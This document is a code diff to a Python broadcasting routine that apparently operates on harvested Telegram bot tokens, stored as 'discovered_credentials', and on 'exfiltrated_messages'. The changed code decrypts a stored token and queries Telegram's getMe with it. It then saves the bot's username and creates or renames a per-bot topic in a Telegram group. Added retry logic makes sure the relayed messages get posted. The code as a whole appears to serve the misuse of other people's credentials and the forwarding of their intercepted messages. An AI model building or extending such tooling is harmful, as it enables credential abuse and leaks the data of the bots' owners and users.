@@ -530,14 +530,45 @@ async def _broadcast_logic():
             # Priority: @username / botid -> chat_name -> Cred-ID
             bot_username = meta.get("bot_username")
             bot_id = meta.get("bot_id")
-            
-            # If we lack bot info (Legacy data), try to fetch and extract it from token
-            if not bot_id and not meta.get("bot_id"):
-                 # Only fetch if we really need it and haven't tried before (optimization)
-                 # But for safety/simplicity let's just do the fallback logic if basic checks fail
-                 pass 
 
-            if bot_username and bot_id:
+            # Resolve unknown usernames via getMe before creating/finding topics
+            if (not bot_username or bot_username == "unknown") and bot_id:
+                try:
+                    cred_res = await async_execute(
+                        db.table("discovered_credentials")
+                        .select("bot_token").eq("id", cred_id).single()
+                    )
+                    if cred_res.data:
+                        raw_token = cred_res.data.get("bot_token") if isinstance(cred_res.data, dict) else cred_res.data[0]["bot_token"]
+                        decrypted = security.decrypt(raw_token).strip()
+                        async with httpx.AsyncClient(timeout=10.0) as _hc:
+                            gm = await _hc.get(f"https://api.telegram.org/bot{decrypted}/getMe")
+                            if gm.status_code == 200:
+                                gm_data = gm.json().get("result", {})
+                                resolved_username = gm_data.get("username")
+                                if resolved_username:
+                                    bot_username = resolved_username
+                                    # Persist resolved username to DB
+                                    fresh_meta = await async_execute(
+                                        db.table("discovered_credentials")
+                                        .select("meta").eq("id", cred_id).single()
+                                    )
+                                    upd_meta = dict((fresh_meta.data or {}).get("meta") or {})
+                                    upd_meta["bot_username"] = bot_username
+                                    await async_execute(
+                                        db.table("discovered_credentials")
+                                        .update({"meta": upd_meta}).eq("id", cred_id)
+                                    )
+                                    # Rename existing @unknown topic if it has a cached thread_id
+                                    old_topic_id = upd_meta.get("topic_id")
+                                    if old_topic_id:
+                                        new_name = f"@{bot_username} / {bot_id}"
+                                        await broadcaster.rename_topic(group_id, old_topic_id, new_name)
+                                        logger.info(f"    Renamed topic {old_topic_id} from @unknown to @{bot_username}")
+                except Exception as e_resolve:
+                    logger.debug(f"[Broadcast] Could not resolve username for bot_id {bot_id}: {e_resolve}")
+
+            if bot_username and bot_username != "unknown" and bot_id:
                  topic_name = f"@{bot_username} / {bot_id}"
             elif bot_id:
                  topic_name = f"@unknown / {bot_id}"
@@ -565,11 +596,17 @@ async def _broadcast_logic():
                      except Exception as e_dec:
                                 logger.debug(f"[Broadcast] Could not decrypt token for legacy bot_id extraction: {e_dec}")
 
-                # Ensure Topic
-                thread_id = await broadcaster.ensure_topic(group_id, topic_name)
-                
-                # Header handled automatically
-                
+                # Ensure Topic — raises on failure so message is retried later
+                try:
+                    thread_id = await broadcaster.ensure_topic(group_id, topic_name)
+                except Exception as e_topic:
+                    logger.error(f"    ❌ [Broadcast] Topic creation failed for {cred_id}: {e_topic}")
+                    # Clear claim so this message is retried on next broadcast run
+                    await async_execute(db.table("exfiltrated_messages").update({
+                        "broadcast_claimed_at": None
+                    }).eq("id", msg_id))
+                    continue
+
                 # Re-fetch meta before write — prevents overwriting concurrent enrich updates
                 fresh = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
                 meta = dict((fresh.data or {}).get("meta") or {})
@@ -590,17 +627,15 @@ async def _broadcast_logic():
                 err_str = str(e)
                 if "Topic_deleted" in err_str or "message thread not found" in err_str or "TOPIC_DELETED" in err_str:
                     logger.warning(f"    ⚠️ Topic {thread_id} deleted! Recreating '{topic_name}'...")
-                    # Recreate
-                    thread_id = await broadcaster.ensure_topic(group_id, topic_name)
-                    # Re-fetch meta before write
-                    fresh2 = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
-                    meta = dict((fresh2.data or {}).get("meta") or {})
-                    meta["topic_id"] = thread_id
-                    await async_execute(db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id))
-                    # Update Cache so subsequent messages in this batch don't recreate again
-                    cached_topic_ids[cred_id] = thread_id
-                    # Retry Send
                     try:
+                        thread_id = await broadcaster.ensure_topic(group_id, topic_name)
+                        # Re-fetch meta before write
+                        fresh2 = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
+                        meta = dict((fresh2.data or {}).get("meta") or {})
+                        meta["topic_id"] = thread_id
+                        await async_execute(db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id))
+                        cached_topic_ids[cred_id] = thread_id
+                        # Retry Send
                         await broadcaster.send_message(group_id, thread_id, msg)
                         send_success = True
                     except Exception as retry_e:
